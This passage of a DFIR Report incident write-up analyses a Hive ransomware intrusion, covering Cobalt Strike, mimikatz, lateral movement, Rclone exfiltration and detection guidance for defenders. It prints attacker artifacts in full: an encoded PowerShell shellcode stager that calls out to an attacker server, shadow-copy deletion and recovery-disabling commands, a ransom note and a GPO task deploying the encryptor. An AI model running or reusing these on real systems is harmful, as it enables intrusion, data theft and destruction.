SNUfkV7IkKbnJA%2bFm3iIlibtMnx3UkcNWYFiBObGjWY1eGzcOusEsAt4oZUVeMxiLUrpYZrGOFtqp1Mm4z5JEst4Bx3sYuQxxKrjs9pF9C9kgpj3Hhresa7b64pIu7SWku14fXjA1VxyYUg52vYoXzxWvn99hsF47CXOkGnQUhPWZkUFA75OCKh0Qp1yoZTyW7HI1MqV4A7Sw%2ftiyK13vPiKhRAojufru7axnGsthZ3eG62TxSD6q3uoBmy6G9lDdCQvi946unMf70FDmfRye2p8%2f2cBmqWe%2fpdzXIWqy%2bRwclHOOf4d5i%2fAZYzN%2fuvKayxkYwOMYo2bI8YwwYgWsRSQUmtsD1Q9%2bYG%2bpZtGvTkpdmsNzIzWNxg7LZUr3l2JqFdwlYgK3peySScsbRRxUuB6aIlxSoDvXo5KtDiKfxnkridOz4iz5T5yk7QJfSEEMnvmep0T4a75KvgZeMWd%2fUj4SKbG3v%2bDA2ZxVSFbktcAur8rkpDwqLwTUjYnvqJG%2bl%2blEgGHRsi5GxxlnM9k6IkCMACku40jzCYSvHOhFtimnMTmf2XOwavP32025803AMFp%2b5vrZ5rASeRNbos1EJi6LD8kdsJUkyShEKByaULaDhAFw3RglgiBxCCbGQPJHkd4ctpUeQmDPvu6IuMtw3mvNU%2fPKtzKcF6%2bqDjCkoF%2fWCHykMjSr37d%2fGrYEIB8ddw173TWYsG9Ei0%2boHEWjEvoAbtUcIxSN%2f4KZ0zUFdC79EOUQcnO1FiHZZHJJhUvLqD7ooZMp2S1%2f%2bpFFMmJC5hAZ3HBQHJjxLV6LWOYfkrDYsgf8D%2bWObpD9JPsgC5G%2fnmG8d9ArdlHBsOM2WobtioC4kdINw2JM6uqMvRAoCqkxrDmwQBkdbkIYLQOcAxhp7%2bj0KOnJ81ieO6Q4BmEUVcZpmmKKc8gV54eNKKr6EU%2fWgvqcmiCwv38i0h5J0AAAADebuB1klSTYkUNnr4J2kDkx0KsClquUNNxOifeVYIq4dqVz4jQZETw5fHbwxKP4Yxv4XZ2yxLM%2f%2b5iIuUFwyWT&t=&c=&c=&c=&c=&c=&c=&c=&c="

## Atera

Similar to ScreenConnect’s persistence, Atera was persisted as an auto-started own-process service. This also could be observed using the System event _7045_.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-028.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-028.png)

## Privilege Escalation

### ScreenConnect, Atera

Being installed as a service, ScreenConnect and Atera benefit from System-level permissions. Relying on services to obtain System-level permissions is an often-employed technique part of both legitimate tools (e.g., [PsExec’s ](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec#using-psexec)_[-s](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec#using-psexec)_) and malicious ones (e.g., [Metasploit’s ](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)_[getsystem](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)_).

Identifying service executions can be performed through both Sysmon’s event _1_ as well as the built-in Security event _4688_ where the parent process is _C:\Windows\System32\services.exe_. As can be seen in the following capture, these service executions run as local [SYSTEM](https://learn.microsoft.com/en-us/windows/win32/secauthz/well-known-sids) (SID _S-1-5-18_).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-029.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-029.png)

## Defense Evasion

### Process Injection

As observed in nearly all intrusions, process injection was leveraged to masquerade the real origin of malicious actions. Depending on the employed techniques, multiple artifact combinations are available in the logs such as Sysmon’s:

  * event _10_ (process accessed), common for injecting into existing processes.
  * event _8_ (remote thread created).
  * event _1_ (process created), or alternatively Security event _4688_ , to identify improbable processes such as the often abused default _rundll32.exe_.



As widely documented in our “[Cobalt Strike, a Defender’s Guide](https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/)” series, evidence of process injection can be supported by the later creation of post-exploitation (_\postex_*_) named-pipes (Sysmon event _17_ and _18_).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-030.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-030.png)

In-memory, YARA scans conducted during the intrusion using the win_cobalt_strike_auto rule from [Malpedia](https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike) showed some of the various injections performed.

Host | Pid | Process | Commandline | Rule  
---|---|---|---|---  
SERVER | 1808 | svchost.exe | C:\Windows\system32\svchost.exe -k netsvcs | win_cobalt_strike_auto  
DOMAINCONTROLLER | 656 | lsass.exe | C:\Windows\system32\lsass.exe | win_cobalt_strike_auto  
FILE SHARE | 572 | winlogon.exe | winlogon.exe | win_cobalt_strike_auto  
FILE SHARE | 2052 | spoolsv.exe | C:\Windows\System32\spoolsv.exe | win_cobalt_strike_auto  
FILE SHARE | 2184 | svchost.exe | C:\Windows\system32\svchost.exe -k ftpsvc | win_cobalt_strike_auto  
  
### Artifact Removal

Throughout the intrusion, the threat actor covered their traces by deleting useful artifacts. As outlined by Sysmon’s event _23_ (file delete), some actions were as expected, taken automatically by both stagers and RMM utilities.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-031.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-031.png)

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-062.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-062.png)

Process execution logs, however, highlighted some of the manual deletions performed by the threat actor, either through native actions, (e.g. the _del_ command) as well as through their attacker tools (e.g. using _rclone config_ to erase attacker credentials).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-032-1.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-032-1.png)

## Credential Access

### LSASS Dumping

Throughout the intrusion, the threat actor accessed LSASS on multiple occasions, a pattern commonly leveraged for credential dumping and injection. As can be seen in the following capture, the threat actor’s actions even resulted in LSASS crashing on one host.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-033.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-033.png)

To help facilitate credential dumping, the threat actor dropped the file _m2.exe_. This appeared to be a custom compiled mimikatz binary. We can confirm the file being mimikatz-related, using YARA rules published in the [mimikatz repository](https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-034.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-034.png)

Through dynamic analysis, we can confirm the _m2.exe_ binary is essentially set up to automatically run the _privilege::debug_ (privilege escalation) and _sekurlsa::logonpasswords_ (credential access) mimikatz commands on execution, rather than require user input or command line arguments.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-035.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-035.png)

While the LSASS dumps align with the intention and abuse of additional credentials, it remains unclear how the initial local administrator account was obtained.

## Discovery

### ScreenConnect

As part of the initial discovery, the threat actor leveraged ScreenConnect’s command execution to obtain system, network, users and domain administrators information. This activity can typically be traced through the process creation logs (Security _4688_ and Sysmon _1_).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-036.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-036.png)

### Cobalt Strike

After launching Cobalt Strike DLL beacons, the threat actor used several _nltest_ commands to look up domain information.
    
    
    cmd.exe /C nltest /dclist:
    cmd.exe /C nltest /DOMAIN_TRUSTS
    cmd.exe /C nltest /domain_trusts /all_trusts
    

### quser

Later, throughout the intrusion, the threat actor leveraged [Impacket’s ](https://github.com/rapid7/metasploit-framework/blob/2722067108b5c034da9f77b95eaf1c1db33db4fa/modules/auxiliary/scanner/smb/impacket/wmiexec.py#L127)_[WMIEXEC](https://github.com/rapid7/metasploit-framework/blob/2722067108b5c034da9f77b95eaf1c1db33db4fa/modules/auxiliary/scanner/smb/impacket/wmiexec.py#L127)_[ class over Metasploit](https://github.com/rapid7/metasploit-framework/blob/2722067108b5c034da9f77b95eaf1c1db33db4fa/modules/auxiliary/scanner/smb/impacket/wmiexec.py#L127) to discover active user sessions using the [_quser_ command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/quser).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-037.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-037.png)

### adcomp.bat

The threat actor was also observed running a bash script called _adcomp.bat,_ in order to enumerate the names, OS versions, IP addresses, and other information on the domain controllers.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-038.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-038.png)

The content of this script was the following PowerShell command:
    
    
    powershell Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address

### Netping

We observed the threat actor drop a binary named _netping.exe_ early in the third day of the intrusion, which they promptly executed (and later erased) as outlined in Sysmon’s process creation logs.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-039.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-039.png)

While Sysmon’s network events do not record ICMP traffic, network captures recorded at the same time a PING-sweep (ICMP type 8) of 255 hosts confirming the netping executable was likely leveraged to identify devices on the _/24_ range.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-040.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-040.png)

### Netscan

NetScan from [SoftPerfect](https://www.softperfect.com/products/networkscanner/) has been reported [multiple times](https://thedfirreport.com/?s=netscan) as a tool of choice for network discovery. This time, the threat actor dropped it on the third day of the intrusion to perform an RDP (port _3389_) scan.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-041.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-041.png)

### Manual Discovery

On the file server, the threat actor was seen browsing several folders around the same time these were exfiltrated, confirming manual exfiltration from hands-on keyboard activities. This can be seen by examining the ShellBags registry artifact using Eric Zimmerman’s [ShellBags Explorer](https://ericzimmerman.github.io/#!index.md).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-042.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-042.png)

## Lateral Movement

### Remote Desktop Protocol

As expected after the RDP scan, the actor was observed performing lateral movement using the Remote Desktop Protocol from a single compromised server. While for remote interactive sign-ins the origin workstation name matched the targeted machines, network logons using both the same compromised accounts and the origin server had a workstation name of _WIN-RRRU9REOK18_.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-043.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-043.png)

Between RDP connections, re-connections were observed as shown by the presence of logon types _7_ (_Unlock_) indicating additional RDP activity took place on the file share and backup servers.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-044.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-044.png)

### 

### WMIEXEC

As shown previously, the threat actor leveraged [Impacket’s ](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)_[WMIEXEC](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)_[ class](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) to perform lateral movement (specifically execution). Detecting such activity can be done through a combination of patterns available in process creation events (e.g. Sysmon event _1_) which have been [outlined by CrowdStrike](https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/):

  * A [command-line starting](https://github.com/fortra/impacket/blob/6a3ecf7efc7dd686cc4c5fec46bbaa15ea679039/examples/wmiexec.py#L127C25-L127C39) with _cmd.exe /Q /c_.
  * A [command-line ending with the redirection of outputs](https://github.com/fortra/impacket/blob/6a3ecf7efc7dd686cc4c5fec46bbaa15ea679039/examples/wmiexec.py#L295) as 1> \\\127.0.0.1\\{{share}}\\{{output}} 2>&1 where the output contains the current timestamp.
  * A parent process of _wmiprvse.exe_ due to the usage of WMI.



The following capture is a subset of the attacker-initiated WMI-backed executions.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-045.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-045.png)

### 

### Remote Services

Throughout the intrusion, the threat actor relied on remote services for lateral movement. One of the commonly employed tactics relies on the deployment of malicious files, DLLs in our case, over SMB, followed by its execution through remote services.

As part of the file creation over SMB, the Security log’s event _5145_ ([A network share object was checked to see whether client can be granted desired access](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5145)) maintains traces of access checks performed prior to SMB actions being taken. As can be seen below, the _5145_ event provides valuable network share insights, such as which user attempts to perform an operation and from where.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-046.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-046.png)

Similarly, these file creation events can also be observed via network logs like Zeek’s _smb_files_ events.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-047.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-047.png)

After the file creation over SMB, the System event _7045_ will register the service installations.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-048.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-048.png)

In these cases, the DLLs are believed to have been Cobalt Strike beacons towards the newly used _23.108.57[.]83:443_ (_sodiwugoc[.]com_) command & control infrastructure.

#### Fileless

Besides the DLLs, the threat actor was seen performing one fileless lateral movement, where the remote service triggered the following PowerShell stager.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-049.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-049.png)
    
    
    C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAOZQUWMCA7VWbW/aSBD+nEj5D1aFZFshGAfaNJEq3ZpXE5xADATCodNir+2FtQ32GgK9/vcbg52m17RqTzorL+vdmdmZZ56ZsZMEFqdhIJBJXfh8dnrSwxH2BanAW4uiUOADP1rLJydwUAjeC58EaYpWq3roYxrMbm5qSRSRgB/fSy3CURwTf84oiSVZ+Ft49EhELu7nC2Jx4bNQ+KvUYuEcs0xsV8OWR4QLFNjpWTe0cOpLyVwxyiXxzz9FeXqhzkqNdYJZLInmLubEL9mMibLwRU4vHOxWRBINakVhHDq89EiDymVpGMTYIXdgbUMMwr3QjkUZYoCfiPAkCgSIJlU/HkoiLHtRaCHbjkgci0VhmhqezmZ/SNPs1ock4NQnJT3gJApXJok21CJxqY0Dm5EH4sxAy+QRDdyZLIPYJlwSqRAkjBWF3zEj3ZFtjtmvKkmvlUCqxyO5CFn8LkojtBNGjnriG26meZfheck9wPbl7PTs1MmJ4rHXPIHVyfSwJuCa1AtjepD6JJSLggHXYB5GO3gtDKKEyLMXYIXCrv/wUPyxvpoLg+jWgo3pKKT2DBSyTBY2w9TwTwhZJw4NSH0XYJ9aOeekt/AlDiOH8Eq52B14JInZAbHrhBEX8xSzNM3fqTV8yl90tYQym0TIghzF4BWkT/7WmWMaJFEPDOIDQMd34F3BAaaTXDpj9y6/PX0HIbHGcBwXhV4CpWYVBZNgRuyigIKYZkco4eFhKX5110gYpxaOeW5uJmcwZtfVwiDmUWJByiD0gbkiFsUsRaIotKlNtJ1J3fxa8U0capgxqACwtIE8wE4av8lTIkTg4SHpcskkXPdXjPggcyj5JsMuFHjG8wNzsEts8V8O5kQ+sjZFIofglXuQXpOFvCiMaMShcaSobq3/dverhpF6UYtIlgUpr4uptuMpnwse73yspXzMQDlAEHEIvxmFvoZj8qF6bA/SO+We1hA8Ez1ghqUtqYq2VNUN+B3Sih7Wr+zbzqKtRPVnz0F6rBvtXr3fblc3HXNU5WZD57c9nRuN8WJhovbDcMKfdNQe0PJyUt2vOnRvdpE9eVY+7LX9tqw97xeu7UzqjuNeOeaD+r5Ju4+1vla+xN16I+k+alutXI0bdNvu02F/2Wny+WTE8NBR3LF6jelzN1qM1NDY6wi1vIq17zijlmfYu0mbkoVS7tI+6iN0az0Mhy135bZipFyP1ggGwIfapoORjhqjXec90/rDpoaGDa2P78Ne5byuqE/2utF8GuOOz+xWW1EnY2SjSBm4nnp17wUpTtjV1loqg7pPu6YCMr0qalcv6f5p3W+5qAEyIz9EuEmXw/Mx2LwbgM7jULVDxAN9rCgjV3GRY3oTjDSQ1taoqYW13cee0VNGo0tPnS9VD3wm481Ho4POm1ZPUZRzfw5/FWQZq+dgrG2vNm7bDG/xLR5tniqKOti2HLRG5+eaqs15u1HpbODegXI9/PQu5Q8QqBA8Xr+ixY9auYGj2MMM6AJdOi/QZhg1s77bC2mqIUnpoF6SKCAMBh2MwpzmiLHQSps+NGgYN8chkM6kISwrl2+uZOFFUP46DPKtm5sncBEK50DtUpcELveK5edKuQzNvfxcLUOIvx5XLVztpKOtYjodUmBejLODcTmtqEI818P/FbGsjD34Z/8csa97Pzn9JRTLxUO83+1+u/FbgP5u2I+YchA0oQUxchyAb0WfUePVx0GaEMi7kz3pl919wi/u4Jvh7PQfmcFDmkIKAAA=''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"

Using PowerShell logs’ event _4104_ (part of [PowerShell Script Tracing and Logging](https://learn.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7.3)), one can recover the decoded PowerShell, which in this case executes shellcode into the PowerShell process itself.
    
    
    function eYD {
    	Param ($tGj, $tTmrq)		
    	$n5 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    	
    	return $n5.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($n5.GetMethod('GetModuleHandle')).Invoke($null, @($tGj)))), $tTmrq))
    }
    
    function hl {
    	Param (
    		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $yQRR,
    		[Parameter(Position = 1)] [Type] $wc = [Void]
    	)
    	
    	$vUy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    	$vUy.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $yQRR).SetImplementationFlags('Runtime, Managed')
    	$vUy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $wc, $yQRR).SetImplementationFlags('Runtime, Managed')
    	
    	return $vUy.CreateType()
    }
    
    [Byte[]]$htJ8C = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqAWhe6CvJaAIAEVyJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
    		
    $nW9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eYD kernel32.dll VirtualAlloc), (hl @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $htJ8C.Length,0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($htJ8C, 0, $nW9, $htJ8C.length)
    
    $sbIo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eYD kernel32.dll CreateThread), (hl @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$nW9,[IntPtr]::Zero,0,[IntPtr]::Zero)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((eYD kernel32.dll WaitForSingleObject), (hl @([IntPtr], [Int32]))).Invoke($sbIo,0xffffffff) | Out-Null
    

As was the case for the previous shellcode, this stager retrieves the next stage using websockets from _94.232.43[.]201:4444_.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-050.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-050.png)

## Exfiltration

After two days and 11 hours, the threat actor dropped [Rclone](https://rclone.org/) on a file server and exfiltrated several files over SFTP to _190.2.146[.]96:22_ . The typos made on the commands, and the time it took to exfiltrate the files, suggest that exfiltration happened manually (hands-on-keyboard activity):

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-051.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-051.png)

The exfiltration could easily be spotted from a network perspective in controlled environments since the amount of exfiltrated data is very high compared to the usual traffic:

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-052.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-052.png)

We reported on the usage of Rclone in a couple of our [previous reports](https://thedfirreport.com/?s=rclone). Additionally, [this blog from NCC Group](https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/) is a great resource for understanding exfiltration via Rclone and detecting this activity using Sigma rules.

## Command and Control

Throughout the intrusion, multiple Command & Control channels were established. Some channels relied on legitimate RMM services (ScreenConnect, Atera & Splashtop) while other tooling is specifically adversary (Cobalt Strike, Metasploit). The following timeseries (logarithmic scale) outlines the traffic generated by the different tooling, highlighting their deployment & usage order.

Most interesting is how, solely from a network perspective, a drastic anomalous increase in activity can be observed hours/minutes prior to the exfiltration and impact stages. This rupture in C2 patterns without new infections offers incident responders potential telltale signs of an imminent change of adversary intent.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-053.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-053.png)

To provide a perspective on the above logarithmic scale, the approximate one hour and 30 minutes of Rclone exfiltration accounted for more than 90% of the attacker-generated network traffic.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-054.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-054.png)

#### Cobalt Strike

**IP** | **Port** | **Domain** | **JA3** | **JA3s**  
---|---|---|---|---  
31.41.244.192 | 80 | N/A | N/A | N/A  
23.108.57.83 | 443 | sodiwugoc[.]com | a0e9f5d64349fb13191bc781f81f42e1 | ae4edc6faf64d08308082ad26be60767  
SSL Certificate SHA256 | [95C86AC5CE23ABA5133F61CA0D2D637F74105FA05E88D232141F057A1DF7DD8B](https://crt.sh/?q=95C86AC5CE23ABA5133F61CA0D2D637F74105FA05E88D232141F057A1DF7DD8B)  
---|---  
Certificate Subject | sodiwugoc[.]com  
Certificate Issuer | Sectigo Limited  
Not Before | 2022-10-19 00:00:00 UTC  
Not After | 2023-10-19 23:59:59 UTC  
Public Algorithm | TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384  
  
### Metasploit

**IP** | **Port**  
---|---  
94.232.43.201 | 4433  
94.232.43.201 | 4444  
  
### ScreenConnect

IP | Port | Domain  
---|---|---  
145.40.113.124 | 443 | server-nixd7639ccc-relay[.]screenconnect[.]com  
147.75.84.232 | 443 | server-nixee656b9a-relay[.]screenconnect[.]com  
  
## 

## Impact

With exfiltration achieved, the threat actor proceeded to the impact stage. First, they changed the administrator account’s password, and one hour later, they started deploying ransomware.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-055.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-055.png)

As can be seen in the following process creation logs, the ransomware was executed both from the beacons, as well as interactively by opening the command interpreter (_cmd.exe_). Once critical systems encrypted, the threat actor completed their impact with a final network share encryption (_-network-only_).

To avoid analysis by threat intelligence companies should the sample leak online, the ransomware executable requires credentials for their chat to be provided through the command line argument _-u_.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-063.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-063.png)

As part of the encryption, the ransomware inhibits system recovery by deleting all shadow copies and altering boot settings.
    
    
    "C:\Windows\System32\wbem\WMIC.exe" shadowcopy delete
    "C:\Windows\System32\vssadmin.exe" delete shadows /all /quiet
    "C:\Windows\System32\bcdedit.exe" /set {default} recoveryenabled No
    "C:\Windows\System32\bcdedit.exe" /set {default} bootstatuspolicy ignoreallfailures
    

Once encrypted, the ransom note is written to _C:\Users\Default\HOW_TO_DECRYPT.txt_ which, when accessed, reveals the ransomware operation to be the [now-seized](https://www.justice.gov/opa/pr/us-department-justice-disrupts-hive-ransomware-variant) Hive.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-056.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-056.png)
    
    
    Your network has been breached and all data were encrypted.
    Personal data, financial reports and important documents are ready to disclose.
    
    To decrypt all the data and to prevent exfiltrated files to be disclosed at 
    http://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd.onion/
    you will need to purchase our decryption software.
    
    Please contact our sales department at:
    
       http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd.onion/
    
          Login:    REDACTED
          Password: REDACTED
    
    To get an access to .onion websites download and install Tor Browser at:
       https://www.torproject.org/ (Tor Browser is not related to us)
    
    
    Follow the guidelines below to avoid losing your data:
    
     - Do not modify, rename or delete *.key files. Your data will be 
       undecryptable.
     - Do not modify or rename encrypted files. You will lose them.
     - Do not report to the Police, FBI, etc. They don't care about your business.
       They simply won't allow you to pay. As a result you will lose everything.
     - Do not hire a recovery company. They can't decrypt without the key. 
       They also don't care about your business. They believe that they are 
       good negotiators, but it is not. They usually fail. So speak for yourself.
     - Do not reject to purchase. Exfiltrated files will be publicly disclosed.
    

To achieve domain-wide impact, the threat actor attempted to deploy a Group Policy Object (GPO). The creation of this GPO can be observed by the usage of _gpme.msc_ (Group Policy Management Editor).

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-057.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-057.png)

File creation events highlight how, for the newly created group policy, the threat actor created a scheduled task within the user configuration. This scheduled task was intended to execute the ransomware from a network share on a daily basis. This setting, however, failed to deploy the ransomware domain-wide as such a scheduled task [should be defined within the machine configuration](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/63d65a82-e538-49ad-8009-e5a0e97a40df) instead. This resulted in only successful encryption on the hosts where the threat actor manually ran the ransomware.

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-058.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-058.png)
    
    
    <?xml version="1.0" encoding="utf-8"?>
    <ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
        <Task clsid="{2DEECB1C-261F-4e13-9B21-16FB83BC03BD}" name="REDACTED" image="0"
            changed="REDACTED" uid="{EA5805D5-A098-423E-A5C7-6CD05F23F46F}">
            <Properties action="C" name="REDACTED" appName="cmd.exe"
                args="/c \\REDACTED\netlogon\windows_x64_encrypt.exe -u REDACTED:REDACTED"
                startIn="" comment="" enabled="1">
                <Triggers>
                    <Trigger type="DAILY" startHour="REDACTED" startMinutes="0" beginYear="REDACTED"
                        beginMonth="REDACTED" beginDay="REDACTED" hasEndDate="0" repeatTask="0" interval="1" />
                </Triggers>
            </Properties>
        </Task>
    </ScheduledTasks>
    

## Timeline

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-2.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-061-2.png)

## Diamond Model

[![](https://thedfirreport.com/wp-content/uploads/2023/09/18364-060.png)](https://thedfirreport.com/wp-content/uploads/2023/09/18364-060.png)

## Indicators

### Atomic

As this intrusion is dated from 2022, we recommend defenders question the relevancy of potentially outdated network-based indicators such as IPs.
    
    
    # Cobalt Strike C2
    31.41.244[.]192
    23.108.57[.]83
    sodiwugoc[.]com
    
    # Metasploit 
    94.232.43[.]201
    
    # Rclone Exfiltration
    190.2.146[.]96
    

### Computed

The following hashes (SHA256, SHA1, MD5, and optionally, IMPHASH) represent adversary artifacts.
    
    
    # ScreenConnect Installer (C:\Users\REDACTED\AppData\Local\Temp\setup.msi)
    81997F4404FEBFB9C23F2F3939934513D499593750B4A4826C32878E05B83F30
    1107586E676B0DF849948C5A5501CDEC1C72AF9E
    5B4B0713FC9A9B203A9FC2393F26439E
    
    # ScreenConnect Scripts
    ## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\700893a5-90ad-456f-b9a8-7ce8e2f291afrun.ps1
    D04E7E776EA28AF69381E346A1BF86BE5F5E4715003F7048783E7D1F049B1BD2
    93A2CAE74FC883B88049C6C1F92BFD9A45B5881D
    3DF36FB3A469CFE6172A65ED8CF7C8F3
    
    ## C:\Windows\Temp\ScreenConnect\22.8.9717.8313\de873d67-cd59-4075-9a9a-aa1d3cd0817erun.ps1
    F6834C4A5BB01A7D3A43B11A4792F8149714E4D1B271810F79772E50B6395615
    7B9543925CAA83A5145FF5F419D5EBA6F0819133
    BAC73D85EFC48B0517F4E0CC3DDEBB65
    
